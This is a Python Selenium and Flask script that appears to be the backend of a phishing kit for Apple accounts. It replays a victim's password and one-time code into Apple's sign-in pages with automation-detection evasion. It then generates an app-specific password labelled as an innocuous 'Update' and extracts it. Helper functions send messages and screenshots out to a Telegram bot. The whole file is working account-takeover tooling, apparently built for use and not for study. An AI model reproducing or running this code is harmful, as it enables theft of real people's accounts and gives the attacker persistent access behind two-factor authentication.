import shutil
import requests
import os
import tempfile
import re
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import random
from flask import Flask, request, jsonify, send_from_directory
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import StaleElementReferenceException
from core import send_telegram_message
from resend_otp import resend_otp

import json
from datetime import datetime

import logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


def create_driver_session():
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
    import tempfile

    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--user-agent=Mozilla/5.0")
    chrome_options.add_argument(
        "--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option(
        "excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--allow-running-insecure-content")
    chrome_options.add_argument("--disable-extensions")
    # chrome_options.add_argument("--headless=new")  # إذا بغيت headless

    user_data_dir = tempfile.mkdtemp()  # هادي تخدم فـ Windows و Linux
    chrome_options.add_argument(f"--user-data-dir={user_data_dir}")

    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=chrome_options
    )
    driver.execute_script(
        "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    # رجع حتى المسار باش تعود تستعمله فـ حذف الجلسة
    return driver, user_data_dir


def cleanup_old_sessions():
    global user_sessions
    current_time = time.time()
    sessions_to_remove = []
    with session_lock:
        for session_id, session_data in user_sessions.items():
            # 30 دقيقة
            if current_time - session_data.get('last_activity', 0) > 1800:
                try:
                    session_data['driver'].quit()
                    # حذف مجلد كروم الخاص بالجلسة
                    if 'user_data_dir' in session_data:
                        shutil.rmtree(
                            session_data['user_data_dir'], ignore_errors=True)
                    sessions_to_remove.append(session_id)
                except Exception:
                    sessions_to_remove.append(session_id)
        for session_id in sessions_to_remove:
            user_sessions.pop(session_id, None)


def safe_input_via_javascript(driver, element, text):
    try:
        script = """
        var element = arguments[0];
        var text = arguments[1];
        element.focus();
        var focusEvent = new Event('focus', { bubbles: true });
        element.dispatchEvent(focusEvent);
        element.value = text;
        var inputEvent = new Event('input', { bubbles: true });
        element.dispatchEvent(inputEvent);
        var changeEvent = new Event('change', { bubbles: true });
        element.dispatchEvent(changeEvent);
        var keyupEvent = new Event('keyup', { bubbles: true });
        element.dispatchEvent(keyupEvent);
        """
        driver.execute_script(script, element, text)
        time.sleep(1)
        return True
    except Exception:
        return False


def enter_otp_code(driver, otp):
    # Essayer d'entrer le code OTP dans les champs Apple
    try:
        otp_container = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, ".form-security-code-inputs"))
        )
        otp_inputs = otp_container.find_elements(
            By.CSS_SELECTOR, ".form-security-code-input")
        if len(otp_inputs) < 6:
            return False
        for i in range(6):
            otp_inputs[i].click()
            otp_inputs[i].send_keys(otp[i])
            time.sleep(0.2)
        time.sleep(5)
        return True
    except Exception:
        # Fallback: saisir tout le code dans un champ
        try:
            first_otp_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located(
                    (By.CSS_SELECTOR, "input[type='text'][inputmode='numeric'], input[autocomplete='one-time-code']"))
            )
            first_otp_field.click()
            time.sleep(0.5)
            first_otp_field.clear()
            time.sleep(0.5)
            first_otp_field.send_keys(otp)
            time.sleep(2)
            first_otp_field.send_keys(Keys.ENTER)
            time.sleep(5)
            return True
        except Exception:
            return False


def is_login_successful(driver):
    try:
        current_url = driver.current_url.lower()
        page_title = driver.title.lower()
        page_source = driver.page_source.lower()
        success_indicators = [
            "account.apple.com" in current_url and "sign-in" not in current_url,
            "myappleid.apple.com" in current_url,
            "idmsa.apple.com" in current_url and "signin" not in current_url,
            "manage" in current_url,
            "security" in current_url,
            "account" in current_url and "signin" not in current_url,
            "mon compte" in page_title,
            "account" in page_title and "sign" not in page_title,
            "gérer" in page_source,
            "manage your apple" in page_source
        ]
        error_indicators = [
            "vérifiez les informations",
            "incorrect",
            "erreur",
            "invalid",
            "try again",
            "identifiants incorrects",
            "your account has been locked",
            "unable to sign in",
            "sign-in",
            "incorrect apple id or password",
            "apple id or password was incorrect"
        ]
        for err in error_indicators:
            if err in page_source or err in page_title or err in current_url:
                return False
        return any(success_indicators)
    except Exception:
        return False


# ---------- Helpers (fallbacks) ----------

def _tg_send_message_direct(token, chat_id, text, parse_mode=None):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        if parse_mode:
            data["parse_mode"] = parse_mode
        resp = requests.post(url, data=data, timeout=15)
        return resp.status_code == 200
    except Exception as e:
        try:
            logger.warning(f"_tg_send_message_direct error: {e}")
        except:
            pass
        return False


def _tg_send_photo_direct(token, chat_id, photo_bytes, caption=""):
    try:
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        files = {"photo": ("screenshot.png", photo_bytes, "image/png")}
        data = {"chat_id": chat_id, "caption": caption}
        resp = requests.post(url, files=files, data=data, timeout=30)
        return resp.status_code == 200
    except Exception as e:
        try:
            logger.warning(f"_tg_send_photo_direct error: {e}")
        except:
            pass
        return False


def _send_telegram_message_if_available(token, chat_id, text):
    # prefer existing helper if available, else use direct
    try:
        if "_send_telegram_message" in globals() and callable(globals().get("_send_telegram_message")):
            return globals()["_send_telegram_message"](token, chat_id, text)
    except Exception:
        pass
    return _tg_send_message_direct(token, chat_id, text)


def _send_telegram_photo_if_available(token, chat_id, photo_bytes, caption=""):
    try:
        if "_send_telegram_photo" in globals() and callable(globals().get("_send_telegram_photo")):
            # if helper expects path or bytes is unknown; try bytes first
            try:
                return globals()["_send_telegram_photo"](token, chat_id, photo_bytes, caption)
            except Exception:
                pass
    except Exception:
        pass
    return _tg_send_photo_direct(token, chat_id, photo_bytes, caption)

# ---------- Main function ----------


def generate_app_password(driver, password, telegram_token=None, telegram_chat_id=None, wait_timeout=20):
    """
    Génère le mot de passe d'application et le retourne. (البرامترين telegram_token و telegram_chat_id موجودين باش ميوقعش خطأ)
    """
    import re
    import time
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from datetime import datetime

    try:
        driver.get("https://account.apple.com/account/manage")
        WebDriverWait(driver, wait_timeout).until(
            EC.presence_of_element_located((By.TAG_NAME, "body")))
        WebDriverWait(driver, wait_timeout).until(
            lambda d: "/account/manage" in d.current_url)

        xpath_candidates = [
            "//h3[contains(text(), 'Mots de passe pour applications') or contains(text(), 'App-Specific Passwords') or contains(text(), 'كلمات سر خاصة بالتطبيق')]/ancestor::button",
            "//div[contains(text(),'Afficher les détails') or contains(text(),'Show Details') or contains(text(),'عرض التفاصيل')]/ancestor::button",
            "//button[.//div[contains(@class,'card-line')]]",
            "//*[contains(text(),'App-Specific Passwords')]/ancestor::button"
        ]
        app_button = None
        for xpath in xpath_candidates:
            try:
                elems = WebDriverWait(driver, 5).until(
                    EC.presence_of_all_elements_located((By.XPATH, xpath)))
                if elems:
                    for e in elems:
                        if e.is_displayed() and e.is_enabled():
                            app_button = e
                            break
                    if app_button:
                        break
            except:
                continue

        if not app_button:
            return None

        try:
            app_button.click()
        except:
            try:
                driver.execute_script("arguments[0].click();", app_button)
            except Exception:
                return None
        time.sleep(1)

        generate_button = None
        for by, sel in [
            (By.CSS_SELECTOR, ".button-secondary"),
            (By.XPATH, "//button[contains(text(),'Générer') or contains(text(),'Generate') or contains(text(),'إنشاء') or contains(text(),'Create')]")
        ]:
            try:
                els = driver.find_elements(by, sel)
                for el in els:
                    if el.is_displayed() and el.is_enabled():
                        generate_button = el
                        break
                if generate_button:
                    break
            except:
                continue

        if not generate_button:
            return None

        try:
            generate_button.click()
        except:
            try:
                driver.execute_script("arguments[0].click();", generate_button)
            except:
                pass
        time.sleep(1)

        label_input = None
        for by, sel in [
            (By.CSS_SELECTOR, "input.form-textbox-input[type='text']"),
            (By.CSS_SELECTOR, "input[type='text']"),
            (By.XPATH, "//input[@type='text' and (contains(@placeholder,'label') or contains(@aria-label,'label') or contains(@name,'label'))]")
        ]:
            try:
                els = driver.find_elements(by, sel)
                for el in els:
                    if el.is_displayed() and el.is_enabled():
                        label_input = el
                        break
                if label_input:
                    break
            except:
                continue

        if not label_input:
            return None

        # --- MODIFICATION: label with timestamp in English ---
        label_text = "Update " + datetime.now().strftime("%Y-%m-%d")
        label_input.clear()
        label_input.send_keys(label_text)
        time.sleep(0.4)

        create_button = None
        for by, sel in [
            (By.XPATH, "//button[contains(text(),'Créer') or contains(text(),'Create') or contains(text(),'إنشاء') or contains(text(),'Submit')]"),
            (By.CSS_SELECTOR, "button[type='submit']")
        ]:
            try:
                els = driver.find_elements(by, sel)
                for el in els:
                    if el.is_displayed() and el.is_enabled():
                        create_button = el
                        break
                if create_button:
                    break
            except:
                continue

        if not create_button:
            return None

        try:
            create_button.click()
        except:
            try:
                driver.execute_script("arguments[0].click();", create_button)
            except:
                pass
        time.sleep(0.6)

        password_input = None
        for by, sel in [
            (By.CSS_SELECTOR,
             "input[type='password'][autocomplete='current-password']"),
            (By.CSS_SELECTOR, "input[type='password']"),
            (By.XPATH, "//input[@type='password' and (contains(@name,'password') or contains(@placeholder,'Password') or contains(@aria-label,'password'))]")
        ]:
            try:
                els = driver.find_elements(by, sel)
                for el in els:
                    if el.is_displayed() and el.is_enabled():
                        password_input = el
                        break
                if password_input:
                    break
            except:
                continue

        if not password_input:
            return None

        password_input.clear()
        password_input.send_keys(password)
        time.sleep(0.4)

        continue_button = None
        for by, sel in [
            (By.XPATH, "//button[contains(text(),'Continuer') or contains(text(),'Continue') or contains(text(),'متابعة') or contains(text(),'Submit')]"),
            (By.CSS_SELECTOR, "button[type='submit']")
        ]:
            try:
                els = driver.find_elements(by, sel)
                for el in els:
                    if el.is_displayed() and el.is_enabled():
                        continue_button = el
                        break
                if continue_button:
                    break
            except:
                continue

        if not continue_button:
            return None

        try:
            continue_button.click()
        except:
            try:
                driver.execute_script("arguments[0].click();", continue_button)
            except:
                pass

        app_password = None
        pattern = re.compile(r"^[A-Za-z0-9]{4}(?:-[A-Za-z0-9]{4}){3}$")
        end_wait = time.time() + 30
        while time.time() < end_wait and not app_password:
            try:
                dialog_candidates = driver.find_elements(
                    By.XPATH, "//div[@role='dialog']//*[string-length(normalize-space(.))>0]")
                candidates = dialog_candidates
                candidates += driver.find_elements(
                    By.XPATH, "//*[contains(text(),'-') and string-length(normalize-space(.))>=15]")
            except Exception:
                candidates = []
            for el in candidates:
                try:
                    txt = (el.text or "").strip()
                    if not txt:
                        continue
                    for part in re.split(r"[\r\n]+", txt):
                        part = part.strip()
                        if pattern.match(part):
                            app_password = part
                            break
                    if app_password:
                        break
                except:
                    continue
            if not app_password:
                time.sleep(0.5)

        if not app_password:
            return None
        return app_password
    except Exception:
        return None


def enter_otp_code_with_visual_keyboard(driver, otp):
    """Saisir OTP une seule fois sans retry"""
    logger.info(f"Saisie du code OTP avec clavier visuel: {otp}")
    try:
        otp_container = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, ".form-security-code-inputs"))
        )
        otp_inputs = otp_container.find_elements(
            By.CSS_SELECTOR, ".form-security-code-input")
        if len(otp_inputs) < 6:
            logger.error("Pas assez de champs OTP")
            return False

        for i in range(6):
            otp_inputs[i].click()
            otp_inputs[i].send_keys(otp[i])
            time.sleep(0.2)

        logger.info("OTP saisi une seule fois")
        time.sleep(5)  # attendre validation Apple
        return True
    except Exception as e:
        logger.error(f"Erreur OTP: {e}")
        return False


def enter_otp_code(driver, otp):
    """Fonction améliorée pour saisir le code OTP avec plusieurs méthodes"""
    logger.info(f"Saisie du code OTP: {otp}")

    # D'abord essayer la méthode avec simulation de clavier visuel
    if enter_otp_code_with_visual_keyboard(driver, otp):
        return True

    # Si la méthode visuelle échoue, essayer les méthodes classiques

    # Attendre que la page soit complètement chargée
    time.sleep(5)

    # Méthode 1: Recherche spécifique des champs OTP d'Apple
    try:
        # Trouver le conteneur principal des champs OTP
        otp_container = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, ".form-security-code-inputs"))
        )
        logger.info("Conteneur des champs OTP trouvé")

        # Trouver tous les champs OTP
        otp_inputs = otp_container.find_elements(
            By.CSS_SELECTOR, ".form-security-code-input")
        logger.info(f"Nombre de champs OTP trouvés: {len(otp_inputs)}")

        if len(otp_inputs) >= 6:
            logger.info("6 champs OTP trouvés, saisie en cours...")

            # Saisir chaque chiffre dans le champ correspondant
            for i in range(6):
                if i < len(otp):
                    digit = otp[i]
                    # Utiliser JavaScript pour une saisie plus fiable
                    script = """
                    var input = arguments[0];
                    var value = arguments[1];
                    input.value = value;
                    
                    // Déclencher les événements pour activer la validation
                    var event = new Event('input', {bubbles: true});
                    input.dispatchEvent(event);
                    
                    var changeEvent = new Event('change', {bubbles: true});
                    input.dispatchEvent(changeEvent);
                    
                    // Déclencher les événements de keyup et keydown
                    var keydownEvent = new Event('keydown', {bubbles: true});
                    input.dispatchEvent(keydownEvent);
                    
                    var keyupEvent = new Event('keyup', {bubbles: true});
                    input.dispatchEvent(keyupEvent);
                    """
                    driver.execute_script(script, otp_inputs[i], digit)
                    logger.info(f"Chiffre {digit} saisi dans le champ {i+1}")
                    time.sleep(0.3)

            # Vérification que tous les champs sont remplis
            time.sleep(2)
            all_filled = True
            for i in range(6):
                value = driver.execute_script(
                    "return arguments[0].value", otp_inputs[i])
                expected_value = otp[i] if i < len(otp) else ""
                if value != expected_value:
                    all_filled = False
                    logger.warning(
                        f"Champ {i+1} contient '{value}' au lieu de '{expected_value}'")

            if all_filled:
                logger.info("Tous les champs OTP remplis avec succès")

                # Attendre que le système Apple valide automatiquement le code
                logger.info(
                    "Attente de la validation automatique par Apple...")
                time.sleep(8)

                return True

    except Exception as e:
        logger.error(f"Erreur avec la méthode spécifique Apple: {e}")

    # Méthode 2: Méthode de secours - saisie via le premier champ
    try:
        logger.info("Tentative de saisie via le premier champ seulement...")
        first_otp_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located(
                (By.CSS_SELECTOR, "input[type='text'][inputmode='numeric'], input[autocomplete='one-time-code']"))
        )

        # Cliquer et effacer
        first_otp_field.click()
        time.sleep(0.5)
        first_otp_field.clear()
        time.sleep(0.5)

        # Saisir tout le code
        first_otp_field.send_keys(otp)
        logger.info(f"Code OTP complet saisi dans le premier champ: {otp}")
        time.sleep(2)

        # Essayer de soumettre avec Entrée
        first_otp_field.send_keys(Keys.ENTER)
        logger.info("Touche Entrée pressée après saisie du code OTP")
        time.sleep(5)

        return True

    except Exception as e:
        logger.error(f"Erreur avec la méthode de saisie complète: {e}")

    # Si aucune méthode n'a fonctionné
    logger.error("Aucune méthode de saisie OTP n'a fonctionné")
    return False


def simulate_human_typing(element, text, min_delay=0.1, max_delay=0.3):
    """Simuler la frappe humaine avec des délais aléatoires"""
    element.clear()
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(min_delay, max_delay))
